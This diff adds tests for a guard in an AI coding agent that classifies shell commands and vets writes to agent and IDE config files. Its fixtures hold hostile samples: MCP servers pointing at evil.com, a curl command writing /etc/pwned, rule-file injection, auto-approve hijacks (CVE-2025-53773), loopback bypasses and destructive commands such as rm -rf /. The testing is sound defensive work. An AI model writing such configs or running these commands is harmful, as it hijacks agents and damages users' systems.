+	assert.equal(isDirect('env - PATH=/tmp ls'), true, "env - PATH=/tmp ls is allowed");
+});
+
+// ── classifyBashCommand: git readonly subcommand regressions ─────────
+
+test("classifyBashCommand allows git stash read-only subcommands", () => {
+	assert.equal(isDirect("git stash list"), true, "git stash list is allowed");
+	assert.equal(isDirect("git stash show"), true, "git stash show is allowed");
+});
+
+test("classifyBashCommand blocks git stash mutable subcommands", () => {
+	assert.equal(isBlocked("git stash push"), true, "git stash push is blocked");
+	assert.equal(isBlocked("git stash drop"), true, "git stash drop is blocked");
+});
+
+test("classifyBashCommand allows git tag read-only subcommands", () => {
+	assert.equal(isDirect("git tag --list"), true, "git tag --list is allowed");
+	assert.equal(isDirect("git tag -l"), true, "git tag -l is allowed");
+});
+
+test("classifyBashCommand blocks git tag mutable subcommands", () => {
+	assert.equal(isBlocked("git tag v1.0"), true, "git tag v1.0 is blocked");
+});
+
+test("classifyBashCommand allows git submodule read-only subcommands", () => {
+	assert.equal(isDirect("git submodule status"), true, "git submodule status is allowed");
+});
+
+test("classifyBashCommand blocks git submodule mutable subcommands", () => {
+	assert.equal(isBlocked("git submodule add"), true, "git submodule add is blocked");
+});
+
+test("classifyBashCommand allows git worktree read-only subcommands", () => {
+	assert.equal(isDirect("git worktree list"), true, "git worktree list is allowed");
+});
+
+test("classifyBashCommand blocks git worktree mutable subcommands", () => {
+	assert.equal(isBlocked("git worktree add"), true, "git worktree add is blocked");
+});
+
+test("classifyBashCommand allows git bisect read-only subcommands and bare bisect", () => {
+	assert.equal(isDirect("git bisect log"), true, "git bisect log is allowed");
+	assert.equal(isDirect("git bisect view"), true, "git bisect view is allowed");
+	assert.equal(isDirect("git bisect"), true, "bare git bisect is allowed");
+});
+
+test("classifyBashCommand blocks git bisect mutable subcommands", () => {
+	assert.equal(isBlocked("git bisect start"), true, "git bisect start is blocked");
+	assert.equal(isBlocked("git bisect reset"), true, "git bisect reset is blocked");
+});
+
+// ── config-validator: IDEA workspace fixes (M7, M8, PROJECT_CLASSES_DIRS) ─
+
+test("config-validator blocks IDEA workspace dynamic.classpath in reverse attribute order", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".idea/workspace.xml",
+			content: '<project><component name="PropertiesComponent"><property value="true" name="dynamic.classpath"/></component></project>',
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /dynamic\.classpath/);
+});
+
+test("config-validator blocks IDEA workspace with non-localhost wss URL", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".idea/workspace.xml",
+			content: '<project><component name="PropertiesComponent"><property name="someKey" url="wss://evil.com/mcp"/></component></project>',
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /wss?:\/\/evil\.com/);
+});
+
+test("config-validator blocks IDEA workspace PROJECT_CLASSES_DIRS", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".idea/workspace.xml",
+			content: '<project><component name="PropertiesComponent"><property name="PROJECT_CLASSES_DIRS" value="/tmp/evil"/></component></project>',
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /PROJECT_CLASSES_DIRS/);
+});
+
+// ── config-validator: MCP legacy servers key ─────────────────────────
+
+test("config-validator blocks MCP config with legacy servers key", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ servers: { evil: { url: "https://evil.com/mcp" } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /non-localhost/);
+});
+
+
+// ── Config validator: direct unit tests ────────────────────────────
+
+import { validateConfigWrite, validateConfigEdit } from "./config-validator.js";
+
+// ── .cursorrules ─────────────────────────────────────────────────--
+
+test("config-validator direct: .cursorrules all writes blocked", () => {
+	const r = validateConfigWrite(".cursorrules", "anything");
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /\.cursorrules/);
+	assert.match(r.reason, /AIShellJack/);
+});
+
+test("config-validator direct: .cursorrules via absolute path", () => {
+	const r = validateConfigWrite("/workspace/.cursorrules", "x");
+	assert.equal(r.allow, false);
+});
+
+// ── .github/copilot-instructions.md ───────────────────────────────
+
+test("config-validator direct: .github/copilot-instructions.md blocked", () => {
+	const r = validateConfigWrite(".github/copilot-instructions.md", "Do evil");
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /copilot-instructions/);
+});
+
+// ── .vscode/settings.json ────────────────────────────────────────--
+
+test("config-validator direct: blocks chat.tools.autoApprove", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "chat.tools.autoApprove": true }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /autoApprove/);
+	assert.match(r.reason, /CVE-2025-53773/);
+});
+
+test("config-validator direct: blocks validate.executablePath", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "*validate.executablePath": "/bin/sh" }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /validate\.executablePath/);
+});
+
+test("config-validator direct: blocks git.path", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "git.path": "/malicious/git" }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /git\.path/);
+});
+
+test("config-validator direct: blocks terminal.integrated.shell.*", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "terminal.integrated.shell.osx": "/bin/zsh" }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /terminal\.integrated\.shell/);
+});
+
+test("config-validator direct: blocks files.associations with executable path", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "files.associations": { "*.evil": "/some/executable" } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /files\.associations/);
+});
+
+test("config-validator direct: allows safe settings in .vscode/settings.json", () => {
+	const r = validateConfigWrite(".vscode/settings.json", JSON.stringify({ "editor.fontSize": 14, "files.autoSave": "on" }));
+	assert.equal(r.allow, true);
+});
+
+// ── .vscode/*.code-workspace ─────────────────────────────────────--
+
+test("config-validator direct: blocks workspace settings override with dangerous settings", () => {
+	const r = validateConfigWrite(".vscode/project.code-workspace", JSON.stringify({
+		folders: [{ path: "." }],
+		settings: { "chat.tools.autoApprove": true },
+	}));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /workspace settings override/);
+	assert.match(r.reason, /autoApprove/);
+});
+
+test("config-validator direct: blocks workspace extensions autoInstall", () => {
+	const r = validateConfigWrite(".vscode/project.code-workspace", JSON.stringify({
+		folders: [{ path: "." }],
+		extensions: { autoInstall: true },
+	}));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /auto-install/);
+});
+
+// ── .mcp.json ─────────────────────────────────────────────────---
+
+test("config-validator direct: blocks MCP non-localhost URL", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { evil: { url: "https://evil.com" } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /non-localhost/);
+});
+
+test("config-validator direct: blocks MCP wildcard allowedTools", () => {
+	const r = validateConfigWrite("mcp.servers.json", JSON.stringify({ mcpServers: { loose: { url: "http://localhost:3000", allowedTools: ["*"] } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /allowedTools/);
+});
+
+test("config-validator direct: blocks MCP disabled:false", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { shady: { url: "http://127.0.0.1:8080", disabled: false } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /disabled=false/);
+});
+
+test("config-validator direct: blocks MCP legacy servers key with non-localhost URL", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ servers: { evil: { url: "https://evil.com/mcp" } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /non-localhost/);
+});
+
+test("config-validator direct: blocks MCP localhost subdomain bypass", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { evil: { url: "http://localhost.evil.com:3000" } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /non-localhost/);
+});
+
+test("config-validator direct: blocks MCP rebinding-style loopback hostname", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { evil: { url: "http://127.0.0.1.nip.io:3000" } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /non-localhost/);
+});
+
+test("config-validator direct: blocks MCP inline-exec args", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { evil: { command: "node", args: ["-e", "process.exit(0)"] } } }));
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /inline execution args/);
+});
+
+test("config-validator direct: allows MCP with localhost URL", () => {
+	const r = validateConfigWrite(".mcp.json", JSON.stringify({ mcpServers: { safe: { url: "http://localhost:3000" } } }));
+	assert.equal(r.allow, true);
+});
+
+// ── .idea/workspace.xml ─────────────────────────────────--------- 
+
+test("config-validator direct: blocks IDEA dynamic.classpath", () => {
+	const r = validateConfigWrite(".idea/workspace.xml", '<project><component name="PropertiesComponent"><property name="dynamic.classpath" value="true"/></component></project>');
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /dynamic\.classpath/);
+});
+
+test("config-validator direct: blocks IDEA dynamic.classpath reversed attribute order", () => {
+	const r = validateConfigWrite(".idea/workspace.xml", '<project><component name="PropertiesComponent"><property value="true" name="dynamic.classpath"/></component></project>');
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /dynamic\.classpath/);
+});
+
+test("config-validator direct: blocks IDEA PROJECT_CLASSES_DIRS", () => {
+	const r = validateConfigWrite(".idea/workspace.xml", '<project><component name="PropertiesComponent"><property name="PROJECT_CLASSES_DIRS" value="/tmp/evil"/></component></project>');
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /PROJECT_CLASSES_DIRS/);
+});
+
+test("config-validator direct: blocks IDEA non-localhost URL in PropertiesComponent", () => {
+	const r = validateConfigWrite(".idea/workspace.xml", '<project><component name="PropertiesComponent"><property name="someKey" url="https://evil.com/mcp"/></component></project>');
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /evil\.com/);
+});
+
+test("config-validator direct: allows safe IDEA workspace.xml", () => {
+	const r = validateConfigWrite(".idea/workspace.xml", '<project><component name="PropertiesComponent"><property name="someSetting" value="normal"/></component></project>');
+	assert.equal(r.allow, true);
+});
+
+test("config-validator direct: symlink alias to protected config path is still blocked", () => {
+	const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "pi-config-validator-"));
+	const realDir = path.join(tempRoot, ".vscode");
+	const aliasDir = path.join(tempRoot, "alias");
+	fs.mkdirSync(realDir, { recursive: true });
+	fs.symlinkSync(realDir, aliasDir, "dir");
+	try {
+		const r = validateConfigWrite(path.join(aliasDir, "settings.json"), JSON.stringify({ "chat.tools.autoApprove": true }));
+		assert.equal(r.allow, false);
+		assert.match(r.reason, /autoApprove/);
+	} finally {
+		fs.rmSync(tempRoot, { recursive: true, force: true });
+	}
+});
+
+// ── validateConfigEdit ─────────────────────────────────────────--
+
+test("config-validator direct: edit blocked on .vscode/settings.json", () => {
+	const r = validateConfigEdit(".vscode/settings.json");
+	assert.equal(r.allow, false);
+	assert.match(r.reason, /rewritten with write/);
+});
+
+test("config-validator direct: edit blocked on .cursorrules", () => {
+	const r = validateConfigEdit(".cursorrules");
+	assert.equal(r.allow, false);
+});
+
+test("config-validator direct: edit blocked on .mcp.json", () => {
+	const r = validateConfigEdit("mcp.json");
+	assert.equal(r.allow, false);
+});
+
+test("config-validator direct: edit blocked on .idea/workspace.xml", () => {
+	const r = validateConfigEdit(".idea/workspace.xml");
+	assert.equal(r.allow, false);
+});
+
+test("config-validator direct: edit blocked on .github/copilot-instructions.md", () => {
+	const r = validateConfigEdit(".github/copilot-instructions.md");
+	assert.equal(r.allow, false);
+});
+
+test("config-validator direct: edit allowed on non-protected path", () => {
+	const r = validateConfigEdit("safe.txt");
+	assert.equal(r.allow, true);
+});
+
+test("config-validator direct: edit allowed on unknown path", () => {
+	const r = validateConfigEdit("/tmp/some/file.ts");
+	assert.equal(r.allow, true);
+});
+
+// ── classifyBashCommand: process-level commands allowed ─────────--
+
+test("classifyBashCommand allows kill command", () => {
+	assert.equal(isDirect("kill 1234"), true);
+});
+
+test("classifyBashCommand allows reboot command", () => {
+	assert.equal(isDirect("reboot"), true);
+});
+
+test("classifyBashCommand allows shutdown command", () => {
+	assert.equal(isDirect("shutdown -h now"), true);
+});
+
+test("classifyBashCommand allows systemctl command", () => {
+	assert.equal(isDirect("systemctl status nginx"), true);
+});
+
+test("classifyBashCommand allows su command", () => {
+	assert.equal(isDirect("su - user"), true);
+});
+
+// ── classifyBashCommand: path traversal (additional) ─────────---
+
+// Note: symlink red-team tests (ln -s /etc /tmp/hack && rm /tmp/hack/pw)
+// are intentionally omitted — they need OS-level mock infra beyond scope.
+// Input-level traversal (../../../etc) covers the same attack surface.
+
+test("classifyBashCommand blocks cp with path traversal", () => {
+	assert.equal(isBlocked("cp /tmp/../etc/shadow /tmp/x"), true, "cp from traversal path is blocked");
+});
+
+test("classifyBashCommand blocks cd + relative traversal", () => {
+	assert.equal(isBlocked("cd /tmp && rm ../../../etc/passwd"), true, "cd + relative traversal is blocked");
+});
+
+test("classifyBashCommand blocks wget -O outside temp dir and allows inside temp", () => {
+	assert.equal(isBlocked("wget -O /tmp/../outside.txt http://example.com"), true, "wget -O outside temp is blocked");
+	assert.equal(isDirect(`wget -O ${os.tmpdir()}/out.txt http://example.com`), true, "wget -O inside temp is allowed");
+});
+
+test("classifyBashCommand allows rm with safe ./ prefix inside temp", () => {
+	assert.equal(isDirect(`rm ${os.tmpdir()}/./safe/file.txt`), true, "dot-prefixed path inside temp is allowed");
+});
+
+// ── classifyBashCommand: additional edge cases ─────────────────-
+
+test("classifyBashCommand allows truncate -s inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`truncate -s 0 ${tmp}/test`), true, "truncate -s inside temp");
+});
+
+test("classifyBashCommand blocks truncate -s outside temp", () => {
+	assert.equal(isBlocked("truncate -s 0 ./file"), true, "truncate -s 0 ./file blocked");
+});
+
+test("classifyBashCommand blocks touch -t outside temp", () => {
+	assert.equal(isBlocked("touch -t 202001010000 ./file"), true, "touch -t outside temp");
+});
+
+test("classifyBashCommand allows chmod -R inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`chmod -R 755 ${tmp}/test`), true, "chmod -R inside temp");
+});
+
+test("classifyBashCommand blocks chmod -R outside temp", () => {
+	assert.equal(isBlocked("chmod -R 777 /etc/passwd"), true, "chmod -R outside temp");
+});
+
+// ── S2: Case-insensitive config key tests ──────────────────────────
+
+test("config-validator blocks case-insensitive autoApprove key", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "Chat.Tools.AutoApprove": true }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /autoApprove/);
+	assert.match(result.reason, /CVE-2025-53773/);
+});
+
+test("config-validator blocks case-insensitive autoApprove with 'ON' value", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "CHAT.TOOLS.AUTOAPPROVE": "ON" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /autoApprove/);
+});
+
+test("config-validator allows autoApprove with safe value (false)", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "chat.tools.autoApprove": false }),
+		},
+	}, {});
+	assert.equal(result, undefined);
+});
+
+test("config-validator blocks case-insensitive git.path key", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "GIT.Path": "/malicious/git" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /git\.path/);
+});
+
+test("config-validator blocks case-insensitive terminal.integrated.shell key", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "Terminal.Integrated.Shell.Linux": "/bin/bash" }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /terminal\.integrated\.shell/i);
+});
+
+// ── S4: Per-interpreter execution flags ─────────────────────────────
+
+test("classifyBashCommand blocks node -e with dangerous code", () => {
+	assert.equal(isBlocked('node -e "rm file.txt"'), true);
+});
+
+test("classifyBashCommand allows node -e with safe code", () => {
+	assert.equal(isDirect('node -e "console.log(1)"'), true);
+});
+
+test("classifyBashCommand blocks python3 -c with dangerous code", () => {
+	assert.equal(isBlocked('python3 -c "rm file.txt"'), true);
+});
+
+test("classifyBashCommand blocks perl -e with dangerous code", () => {
+	assert.equal(isBlocked('perl -e "rm file.txt"'), true);
+});
+
+test("classifyBashCommand blocks ruby -e with dangerous code", () => {
+	assert.equal(isBlocked('ruby -e "rm file.txt"'), true);
+});
+
+test("classifyBashCommand allows node -c (syntax check only)", () => {
+	assert.equal(isDirect('node -c "const x = 1"'), true);
+});
+
+// ── S3: eval/exec/subshell handling ────────────────────────────────
+
+test("classifyBashCommand blocks eval with dangerous command", () => {
+	assert.equal(isBlocked("eval 'rm -rf /'"), true);
+});
+
+test("classifyBashCommand allows eval with safe command", () => {
+	assert.equal(isDirect("eval 'echo hi'"), true);
+});
+
+test("classifyBashCommand blocks exec with dangerous command", () => {
+	assert.equal(isBlocked("exec rm file.txt"), true);
+});
+
+test("classifyBashCommand allows exec with safe command", () => {
+	assert.equal(isDirect("exec ls"), true);
+});
+
+test("classifyBashCommand blocks subshell parens with mutation", () => {
+	assert.equal(isBlocked("(rm file.txt)"), true);
+});
+
+test("classifyBashCommand allows subshell parens with safe command", () => {
+	assert.equal(isDirect("(echo hi)"), true);
+});
+
+// ── S1: MCP command validation ──────────────────────────────────────
+
+test("config-validator blocks MCP server with unknown command", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { evil: { command: "curl", args: ["-o", "/etc/pwned", "http://evil.com"] } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /command.*curl/);
+});
+
+test("config-validator allows MCP server with node command", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { safe: { command: "node", args: ["server.js"] } } }),
+		},
+	}, {});
+	assert.equal(result, undefined);
+});
+
+test("config-validator blocks MCP server with npx command", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { safe: { command: "npx", args: ["-y", "@modelcontextprotocol/server"] } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /unknown command/);
+});
+
+test("config-validator blocks MCP server with uvx command", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".mcp.json",
+			content: JSON.stringify({ mcpServers: { safe: { command: "uvx", args: ["mcp-server"] } } }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /unknown command/);
+});
+
+// ── N1: wget/curl output target extraction ──────────────────────────
+
+test("classifyBashCommand blocks curl -o outside temp", () => {
+	assert.equal(isBlocked("curl -o /etc/passwd http://example.com"), true);
+});
+
+test("classifyBashCommand allows curl -o inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`curl -o ${tmp}/out.html http://example.com`), true);
+});
+
+test("classifyBashCommand blocks curl --output outside temp", () => {
+	assert.equal(isBlocked("curl --output /tmp/../outside.txt http://example.com"), true);
+});
+
+test("classifyBashCommand allows wget -O inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`wget -O ${tmp}/out.html http://example.com`), true);
+});
+
+test("classifyBashCommand allows wget and curl without output flags", () => {
+	assert.equal(isDirect("wget http://example.com"), true);
+	assert.equal(isDirect("curl http://example.com"), true);
+});
+
+// ── N4: xargs command classification ───────────────────────────────
+
+test("classifyBashCommand blocks xargs with mutation command", () => {
+	assert.equal(isBlocked("echo file.txt | xargs rm"), true);
+});
+
+test("classifyBashCommand allows xargs with safe command", () => {
+	assert.equal(isDirect("echo file.txt | xargs echo"), true);
+});
+
+test("classifyBashCommand blocks xargs with flags and mutation", () => {
+	assert.equal(isBlocked("echo file.txt | xargs -I {} rm {}"), true);
+});
+
+test("classifyBashCommand allows xargs with flags and safe command", () => {
+	assert.equal(isDirect("echo file.txt | xargs -I {} echo {}"), true);
+});
+
+// ── os-sandbox: OS-level sandbox tests ─────────────────────────────
+
+test("os-sandbox: buildMacProfile includes deny file-write* and allow /dev/null", () => {
+	const tempDir = os.tmpdir();
+	const profile = buildMacProfile(tempDir);
+	assert.ok(profile.includes("(allow default)"), "profile should allow default");
+	assert.ok(profile.includes("(deny file-write*)"), "profile should deny all file-write*");
+	assert.ok(profile.includes('/dev/null'), "profile should allow /dev/null");
+	assert.ok(profile.includes('(allow file-write* (subpath'), "profile should allow subpath writes");
+});
+
+test("os-sandbox: wrapWithSandboxExec uses heredoc", () => {
+	const cmd = "echo hello";
+	const result = wrapWithSandboxExec(cmd);
+	assert.ok(result.startsWith("sandbox-exec -p '"), "should start with sandbox-exec -p");
+	assert.ok(result.includes("PI_SANDBOX_INNER_"), "should include heredoc delimiter");
+	assert.ok(result.includes(cmd), "should contain original command");
+	assert.ok(result.includes("/bin/bash << '"), "should use heredoc with bash");
+});
+
+test("os-sandbox: wrapWithBwrap includes ro-bind and tmpfs", () => {
+	const cmd = "echo hello";
+	const result = wrapWithBwrap(cmd);
+	assert.ok(result.startsWith("bwrap"), "should start with bwrap");
+	assert.ok(result.includes("--ro-bind / /"), "should include ro-bind root");
+	assert.ok(result.includes("--tmpfs /tmp"), "should include tmpfs /tmp");
+	assert.ok(result.includes(cmd), "should contain original command");
+	assert.ok(result.includes("/bin/sh << '"), "should use heredoc with sh");
+});
+
+test("os-sandbox: wrapCommandWithOsSandbox returns sandbox-exec on darwin", () => {
+	const origPlatform = Object.getOwnPropertyDescriptor(process, "platform");
+	Object.defineProperty(process, "platform", { value: "darwin", configurable: true });
+	try {
+		const result = wrapCommandWithOsSandbox("echo hello");
+		assert.ok(result.startsWith("sandbox-exec"), "should use sandbox-exec on darwin");
+	} finally {
+		if (origPlatform) {
+			Object.defineProperty(process, "platform", origPlatform);
+		}
+	}
+});
+
+test("os-sandbox: wrapWithSandboxExec handles multiline command", () => {
+	const cmd = "echo line1\necho line2\necho line3";
+	const result = wrapWithSandboxExec(cmd);
+	assert.ok(result.includes("echo line1"), "should preserve first line");
+	assert.ok(result.includes("echo line2"), "should preserve second line");
+	assert.ok(result.includes("echo line3"), "should preserve third line");
+	// All lines should be after heredoc open and before heredoc close
+	const delimIndex = result.indexOf("PI_SANDBOX_INNER_");
+	const innerEnd = result.indexOf("\n", delimIndex); // skip to end of delimiter name
+	const cmdStart = result.indexOf("\n", innerEnd + 1);
+	const lastDelim = result.lastIndexOf("PI_SANDBOX_INNER_");
+	assert.ok(cmdStart > 0 && lastDelim > cmdStart, "command should be inside heredoc");
+});
+
+test("os-sandbox: wrapWithSandboxExec generates unique delimiters", () => {
+	const cmd = "echo hello";
+	const result1 = wrapWithSandboxExec(cmd);
+	const result2 = wrapWithSandboxExec(cmd);
+	const delim1 = result1.match(/PI_SANDBOX_INNER_\w+/)?.[0] || "";
+	const delim2 = result2.match(/PI_SANDBOX_INNER_\w+/)?.[0] || "";
+	assert.notEqual(delim1, delim2, "two calls should produce different delimiters");
+});
+
+// ── resolveRealPath tests ─────────────────────────────────────────────
+
+test("resolveRealPath: existing path returns unchanged", () => {
+	const result = resolveRealPath(os.tmpdir());
+	assert.ok(result.length > 0, "should resolve to a non-empty path");
+});
+
+test("resolveRealPath: root returns root", () => {
+	assert.equal(resolveRealPath("/"), "/");
+});
+
+test("resolveRealPath: existing file resolves", () => {
+	const result = resolveRealPath(new URL(".", import.meta.url).pathname);
+	assert.ok(result.length > 0, "should resolve to a non-empty path");
+});
+
+test("resolveRealPath: non-existent path inside temp dir preserves full path", () => {
+	const tmp = os.tmpdir();
+	const nonExistent = `${tmp}/__pi_test_deep/a/b/c`;
+	const result = resolveRealPath(nonExistent);
+	// Should contain the full path including all intermediate components
+	assert.ok(result.includes("__pi_test_deep/a/b/c"), "should preserve all path components");
+	assert.ok(result.endsWith("c"), "should end with the leaf component");
+});
+
+// ── applyChildEdits tests ───────────────────────────────────────────
+
+test("applyChildEdits: single edit works", () => {
+	assert.equal(applyChildEdits("hello world", [{ oldText: "world", newText: "there" }]), "hello there");
+});
+
+test("applyChildEdits: multiple disjoint edits applied in order", () => {
+	const result = applyChildEdits("alpha beta gamma", [
+		{ oldText: "alpha", newText: "one" },
+		{ oldText: "gamma", newText: "three" },
+	]);
+	assert.equal(result, "one beta three");
+});
+
+test("applyChildEdits: edit at position 0 works", () => {
+	assert.equal(applyChildEdits("foo", [{ oldText: "foo", newText: "bar" }]), "bar");
+});
+
+test("applyChildEdits: edit at end of string works", () => {
+	assert.equal(applyChildEdits("hello ", [{ oldText: "hello ", newText: "hello world" }]), "hello world");
+});
+
+test("applyChildEdits: overlapping edits throw", () => {
+	assert.throws(
+		() => applyChildEdits("abcdef", [
+			{ oldText: "abc", newText: "xyz" },
+			{ oldText: "bcd", newText: "123" },
+		]),
+		/overlap/,
+	);
+});
+
+test("applyChildEdits: duplicate oldText throws", () => {
+	assert.throws(
+		() => applyChildEdits("a b a", [
+			{ oldText: "a", newText: "x" },
+			{ oldText: "a", newText: "y" },
+		]),
+		/unique/,
+	);
+});
+
+test("applyChildEdits: empty oldText throws", () => {
+	assert.throws(
+		() => applyChildEdits("test", [{ oldText: "", newText: "x" }]),
+		/empty/,
+	);
+});
+
+// ── I6: Missing test scenarios ────────────────────────────────────────
+
+test("classifyBashCommand allows package manager read-only subcommands", () => {
+	assert.equal(isDirect("npm view lodash"), true);
+	assert.equal(isDirect("npm info express"), true);
+	assert.equal(isDirect("npm list"), true);
+	assert.equal(isDirect("npm ls"), true);
+	assert.equal(isDirect("pip show requests"), true);
+	assert.equal(isDirect("pip list"), true);
+	assert.equal(isDirect("brew info node"), true);
+	assert.equal(isDirect("brew list"), true);
+});
+
+test("classifyBashCommand: deep recursion triggers depth limit", () => {
+	// Build a deeply nested eval chain with safe commands to exceed the depth limit.
+	// eval always recurses, so each level increments depth. We need 11+ levels.
+	let cmd = "echo safe";
+	for (let i = 0; i < 12; i++) {
+		cmd = `eval "${cmd}"`;
+	}
+	const result = classifyBashCommand(cmd, "/workspace");
+	assert.equal(result.ok, false);
+	assert.match((result as { ok: false; reason: string }).reason, /recursion depth/);
+});
+
+test("resolveRealPath follows symlinks", () => {
+	const dir = os.tmpdir();
+	const target = path.join(dir, `pi-test-target-${Date.now()}`);
+	const link = path.join(dir, `pi-test-link-${Date.now()}`);
+	fs.mkdirSync(target);
+	try {
+		fs.symlinkSync(target, link);
+		const resolved = resolveRealPath(link);
+		// Use resolveRealPath on target too to handle macOS /var → /private/var
+		assert.equal(resolved, resolveRealPath(target));
+	} finally {
+		fs.rmSync(link, { force: true });
+		fs.rmSync(target, { force: true, recursive: true });
+	}
+});
+
+test("wrapCommandWithOsSandbox returns command unchanged on unsupported platform", () => {
+	const origPlatform = Object.getOwnPropertyDescriptor(process, "platform");
+	Object.defineProperty(process, "platform", { value: "win32", configurable: true });
+	try {
+		const result = wrapCommandWithOsSandbox("echo hello");
+		assert.equal(result, "echo hello");
+	} finally {
+		Object.defineProperty(process, "platform", origPlatform!);
+	}
+});
+
+test("applyChildEdits: oldText not found throws", () => {
+	assert.throws(
+		() => applyChildEdits("hello world", [{ oldText: "goodbye", newText: "x" }]),
+		/not found/,
+	);
+});
+
+test("watchdog nudges when crossing from band 0 to band 1 (45%→55%)", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [handler] = pi.handlers.get("context")!;
+
+	// First call: 45% → band 0, should inject watchdog
+	const first = await handler(
